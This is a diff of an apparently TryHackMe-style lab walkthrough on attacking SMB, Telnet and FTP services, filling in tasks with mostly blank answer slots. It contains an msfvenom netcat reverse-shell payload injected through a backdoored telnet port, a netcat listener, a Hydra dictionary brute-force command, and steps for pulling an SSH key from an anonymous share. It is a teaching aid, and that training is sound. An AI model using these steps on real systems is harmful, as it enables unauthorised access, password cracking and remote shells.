@@ -192,6 +192,7 @@ For starters, what is the **workgroup** name?
 
 I am using the improved version of Enum4Linux,
 on [Github](https://github.com/cddmp/enum4linux-ng/)
+This changes the flag from `-a` to `-A`.
 
 ```bash
 ❯ enum4linux-ng.py $ip -A
@@ -382,66 +383,569 @@ What share sticks out as something we might want to investigate?
 
 ***Correct answer:***
 
-## Task 4
+## Task 4: Exploiting SMB
 
-### Subheading
+### Types of SMB Exploit
+
+While there are vulnerabilities such as CVE-2017-7494 that can allow remote code
+execution by exploiting SMB, you're more likely to encounter a situation where the best
+way into a system is due to misconfigurations in the system. In this case, we're going to
+be exploiting anonymous SMB share access- a common misconfiguration that can allow us to
+gain information that will lead to a shell.
+
+### Method Breakdown
+
+So, from our enumeration stage, we know:
+
+- The SMB share location
+- The name of an interesting SMB share
+
+### SMBClient
+
+Because we're trying to access an SMB share, we need a client to access resources on
+servers. We will be using SMBClient because it's part of the default samba suite. While
+it’s already installed on the AttackBox, if you do need to install it on your own
+attacking machine, you can find the documentation here.
+
+We can remotely access the SMB share using the syntax:
+
+```bash
+smbclient //[IP]/[SHARE]
+```
+
+Followed by the tags:
+
+```bash
+-U [name] # to specify the user
+-p [port] # to specify the port
+```
+
+Got it? Okay, let's do this!
 
 ***Answer the questions below***
+
+What would be the correct syntax to access an SMB share called "secret"
+as user "suit" on a machine with the IP 10.10.10.2 on the default port?
 
 ***Correct answer:***
 
-## Task 5
+Great! Now you've got a hang of the syntax, let's have a go at trying to
+exploit this vulnerability. You have a list of users,
+the name of the share (smb) and a suspected vulnerability.
 
-### Subheading
+***Correct answer: No answer needed***
 
-***Answer the questions below***
+Lets see if our interesting share has been configured to allow anonymous access,
+i.e. it doesn't require authentication to view the files. We can do this easily by:
 
-***Correct answer:***
+- using the username "Anonymous"
+- connecting to the share we found during the enumeration stage
+- and not supplying a password.
 
-## Task 6
+Does the share allow anonymous access? Y/N?
 
-### Subheading
+***Correct answer: Y***
 
-***Answer the questions below***
-
-***Correct answer:***
-
-## Task 7
-
-### Subheading
-
-***Answer the questions below***
+Great! Have a look around for any interesting documents that could contain
+valuable information. Who can we assume this profile folder belongs to?
 
 ***Correct answer:***
 
-## Task 8
-
-### Subheading
-
-***Answer the questions below***
+What service has been configured to allow him to work from home?
 
 ***Correct answer:***
 
-## Task 9
-
-### Subheading
-
-***Answer the questions below***
+Okay! Now we know this, what directory on the share should we look in?
 
 ***Correct answer:***
 
-## Task 10
-
-### Subheading
-
-***Answer the questions below***
+This directory contains authentication keys that allow a user to authenticate
+themselves on, and then access, a server. Which of these keys is most useful to us?
 
 ***Correct answer:***
 
-## Task 11
+Download this file to your local machine, and change the permissions to
+"600" using "`chmod 600 [file]`".
 
-### Subheading
+Now, use the information you have already gathered to work out the username
+of the account. Then, use the service and key to log-in to the server.
+
+What is the `smb.txt` flag?
+
+***Correct answer:***
+
+## Task 5: Understanding Telnet
+
+### What is Telnet?
+
+Telnet is an application protocol which allows you, with the use of a telnet client,
+to connect to and execute commands on a remote machine that's hosting a telnet server.
+
+The telnet client will establish a connection with the server. The client will
+then become a virtual terminal- allowing you to interact with the remote host.
+
+### Replacement
+
+Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in
+many applications and services, Telnet has been replaced by SSH in most implementations.
+
+### How does Telnet work?
+
+The user connects to the server by using the Telnet protocol, which means entering
+"`telnet`" into a command prompt. The user then executes commands on the server by using
+specific Telnet commands in the Telnet prompt. You can connect to a telnet
+server with the following syntax: "`telnet [ip] [port]`"
 
 ***Answer the questions below***
+
+What is Telnet?
+
+***Correct answer: Application protocol***
+
+What has slowly replaced Telnet?
+
+***Correct answer: ssh***
+
+How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
+
+***Correct answer: telnet 10.10.10.3 23***
+
+The lack of what, means that all Telnet communication is in plaintext?
+
+***Correct answer: Encryption***
+
+## Task 6: Enumerating Telnet
+
+### Lets Get Started
+
+Before we begin, make sure to deploy the room and give it some time to boot.
+Please be aware, this can take up to five minutes so be patient!
+
+### Enumeration
+
+We've already seen how key enumeration can be in exploiting a misconfigured network
+service. However, vulnerabilities that could be potentially trivial to exploit don't
+always jump out at us. For that reason, especially when it comes to
+enumerating network services, we need to be thorough in our method.
+
+### Port Scanning
+
+Let's start out the same way we usually do, a port scan, to find out as much information
+as we can about the services, applications, structure and operating
+system of the target machine. Scan the machine with nmap.
+
+### Output
+
+Let's see what's going on on the target server...
+
+***Answer the questions below***
+
+How many ports are open on the target machine?
+
+***Correct answer:***
+
+What port is this?
+
+***Correct answer:***
+
+This port is unassigned, but still lists the protocol it's using,
+what protocol is this?
+
+***Correct answer:***
+
+Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
+
+***Correct answer:***
+
+Here, we see that by assigning telnet to a non-standard port, it is not part of the
+common ports list, or top 1000 ports, that nmap scans. It's important to try every angle
+when enumerating, as the information you gather here will inform your exploitation stage.
+
+***Correct answer: No answer needed***
+
+Based on the title returned to us, what do we think this port could be used for?
+
+***Correct answer:***
+
+Who could it belong to? Gathering possible usernames is an important step in enumeration.
+
+***Correct answer:***
+
+Always keep a note of information you find during your enumeration stage,
+so you can refer back to it when you move on to try exploits.
+
+***Correct answer: No answer needed***
+
+## Task 7: Exploiting Telnet
+
+### Types of Telnet Exploit
+
+Telnet, being a protocol, is in and of itself insecure for the reasons we talked about
+earlier. It lacks encryption, so sends all communication over plaintext, and for the most
+part has poor access control. There are CVE's for Telnet client and
+server systems, however, so when exploiting you can check for those on:
+
+- <https://www.cvedetails.com/>
+- <https://cve.mitre.org/>
+
+A CVE, short for Common Vulnerabilities and Exposures, is a list of
+publicly disclosed computer security flaws. When someone refers to a CVE,
+they usually mean the CVE ID number assigned to a security flaw.
+
+However, you're far more likely to find a misconfiguration in how telnet
+has been configured or is operating that will allow you to exploit it.
+
+### Method Breakdown
+
+So, from our enumeration stage, we know:
+
+- There is a poorly hidden telnet service running on this machine
+- The service itself is marked "backdoor"
+- We have possible username of "Skidy" implicated
+
+Using this information, let's try accessing this telnet port,
+and using that as a foothold to get a full reverse shell on the machine!
+
+### Connecting to Telnet
+
+You can connect to a telnet server with the following syntax:
+
+```bash
+"telnet [ip] [port]"
+```
+
+We're going to need to keep this in mind as we try and exploit this machine.
+
+### What is a Reverse Shell?
+
+![reverse-shell](reverse-shell.png)
+
+A "shell" can simply be described as a piece of code or program
+which can be used to gain code or command execution on a device.
+
+A reverse shell is a type of shell in which the target
+machine communicates back to the attacking machine.
+
+The attacking machine has a listening port, on which it receives the
+connection, resulting in code or command execution being achieved.
+
+***Answer the questions below***
+
+Okay, let's try and connect to this telnet port!
+If you get stuck, have a look at the syntax for connecting outlined above.
+
+***Correct answer: No answer needed***
+
+Great! It's an open telnet connection! What welcome message do we receive?
+
+***Correct answer:***
+
+Let's try executing some commands, do we get a return on any
+input we enter into the telnet session? (Y/N)
+
+***Correct answer:***
+
+Hmm... that's strange. Let's check to see if what we're
+typing is being executed as a system command.
+
+***Correct answer: No answer needed***
+
+Start a tcpdump listener on your local machine.
+
+If using your own machine with the OpenVPN connection, use:
+
+```bash
+sudo tcpdump ip proto \\icmp -i tun0
+```
+
+If using the AttackBox, use:
+
+```bash
+sudo tcpdump ip proto \\icmp -i ens5
+```
+
+This starts a tcpdump listener, specifically listening for ICMP traffic,
+which pings operate on.
+
+***Correct answer: No answer needed***
+
+Now, use the command "`ping [local THM ip] -c 1`" through the telnet session
+to see if we're able to execute system commands.
+Do we receive any pings? Note, you need to preface this with `.RUN` (Y/N)
+
+***Correct answer:***
+
+Great! This means that we are able to execute system commands AND
+that we are able to reach our local machine. Now let's have some fun!
+
+***Correct answer:***
+
+We're going to generate a reverse shell payload using msfvenom.
+This will generate and encode a netcat reverse shell for us.
+Here's our syntax:
+
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
+```
+
+- `-p` = payload
+- `lhost` = our local host IP address (this is your machine's IP address)
+- `lport` = the port to listen on (this is the port on your machine)
+- `R` = export the payload in raw format
+
+What word does the generated payload start with?
+
+***Correct answer:***
+
+Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+
+```bash
+nc -lvnp [listening port]
+```
+
+What would the command look like for the listening port we selected in our payload?
+
+***Correct answer:***
+
+Great! Now that's running, we need to copy and paste our msfvenom
+payload into the telnet session and run it as a command.
+Hopefully- this will give us a shell on the target machine!
+
+***Correct answer:***
+
+Success! What is the contents of flag.txt?
+
+***Correct answer:***
+
+## Task 8: Understanding FTP
+
+### What is FTP?
+
+File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote
+transfer of files over a network. It uses a client-server model to do this,
+and, as we'll come on to later, relays commands and data in a very efficient way.
+
+### How does FTP work?
+
+A typical FTP session operates using two channels:
+
+- a command (sometimes called the control) channel
+- a data channel.
+
+As their names imply, the command channel is used for transmitting commands as well as
+replies to those commands, while the data channel is used for transferring data.
+
+FTP operates using a client-server protocol. The client initiates a
+connection with the server, the server validates whatever
+login credentials are provided and then opens the session.
+
+While the session is open, the client may execute FTP commands on the server.
+
+### Active vs Passive
+
+The FTP server may support either Active or Passive connections, or both.
+
+- In an Active FTP connection, the client opens a port and listens.
+The server is required to actively connect to it.
+- In a Passive FTP connection, the server opens a port and
+listens (passively) and the client connects to it.
+
+This separation of command information and data into separate channels is a way of being
+able to send commands to the server without having to wait for the current data transfer
+to finish. If both channels were interlinked, you could only enter commands in between
+data transfers, which wouldn't be efficient for either large file transfers,
+or slow internet connections.
+
+### More Details
+
+You can find more details on the technical function, and implementation of, FTP on the
+Internet Engineering Task Force website: <https://www.ietf.org/rfc/rfc959.txt>. The IETF
+is one of a number of standards agencies, who define and regulate internet standards.
+
+***Answer the questions below***
+
+What communications model does FTP use?
+
+***Correct answer:***
+
+What's the standard FTP port?
+
+***Correct answer:***
+
+How many modes of FTP connection are there?
+
+***Correct answer:***
+
+## Task 9: Enumerating FTP
+
+### Let's Get Started
+
+Before we begin, make sure to deploy the room and give it some time to boot.
+Please be aware, this can take up to five minutes so be patient!
+
+### Enumeration
+
+By now, I don't think I need to explain any further how enumeration is key when attacking
+network services and protocols. You should, by now, have enough experience with nmap to
+be able to port scan effectively. If you get stuck using any tool- you can always use
+"`tool [-h / -help / --help]`" to find out more about it's function and syntax.
+Equally, man pages are extremely useful for this purpose.
+They can be reached using "`man [tool]`".
+
+### Method
+
+We're going to be exploiting an anonymous FTP login, to see what files we can access- and
+if they contain any information that might allow us to pop a shell on the system.
+This is a common pathway in CTF challenges,
+and mimics a real-life careless implementation of FTP servers.
+
+### Resources
+
+As we're going to be logging in to an FTP server, we will need to make sure an FTP client
+is installed on the system. There should be one installed by default on most Linux
+operating systems, such as Kali or Parrot OS. You can test if there is one by typing
+"ftp" into the console. If you're brought to a prompt that says: "ftp>", then you have a
+working FTP client on your system. If not, it's a simple matter of using "sudo apt
+install ftp" to install one.
+
+### Alternative Enumeration Methods
+
+It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server
+variants return different responses to the "cwd" command for home directories which exist
+and those that don’t. This can be exploited because you can issue cwd commands before
+authentication, and if there's a home directory- there is more than likely a user account
+to go with it. While this bug is found mainly within legacy systems,
+it's worth knowing about, as a way to exploit FTP.
+
+This vulnerability is documented at: <https://www.exploit-db.com/exploits/20745>
+
+Now we understand our toolbox, let's do this.
+
+***Answer the questions below***
+
+Run an nmap scan of your choice.
+How many ports are open on the target machine?
+
+***Correct answer:***
+
+What port is ftp running on?
+
+***Correct answer:***
+
+What variant of FTP is running on it?
+
+***Correct answer:***
+
+Great, now we know what type of FTP server we're dealing with we can check to see if we
+are able to login anonymously to the FTP server. We can do this using by typing
+"`ftp [IP]`" into the console, and entering "anonymous", and no password when prompted.
+
+What is the name of the file in the anonymous FTP directory?
+
+***Correct answer:***
+
+What do we think a possible username could be?
+
+***Correct answer:***
+
+Great! Now we've got details about the FTP server and, crucially,
+a possible username. Let's see what we can do with that...
+
+***Correct answer: No answer needed***
+
+## Task 10: Exploiting FTP
+
+### Types of FTP Exploit
+
+Similarly to Telnet, when using FTP both the command and data channels are unencrypted.
+Any data sent over these channels can be intercepted and read.
+
+With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an
+attacker could reveal anything sent through this protocol (such as passwords). An article
+written by JSCape demonstrates and explains this process using ARP-Poisoning to trick a
+victim into sending sensitive information to an attacker, rather than a legitimate source.
+
+When looking at an FTP server from the position we find ourselves in for this machine,
+an avenue we can exploit is weak or default password configurations.
+
+### Method Breakdown
+
+So, from our enumeration stage, we know:
+
+- There is an FTP server running on this machine
+- We have a possible username
+
+Using this information, let's try and bruteforce the password of the FTP Server.
+
+### Hydra
+
+Hydra is a very fast online password cracking tool, which can perform rapid dictionary
+attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS,
+SMB, several databases and much more. Hydra is already installed on the
+AttackBox, however, if you need it on your own attacking machine,
+you can find the GitHub repository [here](https://github.com/vanhauser-thc/thc-hydra).
+
+The syntax for the command we're going to use to find the passwords is this:
+
+```bash
+hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+```
+
+Let's break it down:
+
+|SECTION|FUNCTION|
+|:-|:-|
+|hydra                   |Runs the hydra tool|
+|-t 4                    |Number of parallel connections per target|
+|-l [user]               |Points to the user who's account you're trying to compromise|
+|-P [path to dictionary] |Points to the file containing the list of possible passwords|
+|-vV                     |Sets verbose mode to very verbose, shows the login+pass combination for each attempt|
+|[machine IP]            |The IP address of the target machine|
+|ftp / protocol          |Sets the protocol|
+
+Let's crack some passwords!
+
+***Answer the questions below***
+
+What is the password for the user "mike"?
+
+***Correct answer:***
+
+Bingo! Now, let's connect to the FTP server as this user using
+"`ftp [IP]`" and entering the credentials when prompted.
+
+***Correct answer: No answer needed***
+
+What is `ftp.txt`?
+
+***Correct answer:***
+
+## Task 11: Expanding Your Knowledge
+
+### Further Learning
+
+There is no checklist of things to learn until you've officially learnt everything you
+can. There will always be things that surprise us all, especially in the sometimes
+abstract logical problems of capture the flag challenges. But, as with anything, practice
+makes perfect. We can all look back on the things we've learnt after completing something
+challenging and I hope you feel the same about this room.
+
+### Reading
+
+Here's some things that might be useful to read after
+completing this room, if it interests you:
+
+- <https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef>
+- <https://attack.mitre.org/techniques/T1210/>
+- <https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/>
+
+### Thank you
+
+Thanks for taking the time to work through this room,
+I wish you the best of luck in future. ~ Polo
+
+***Answer the questions below***
+
+Well done, you did it!
 
 ***Correct answer:***
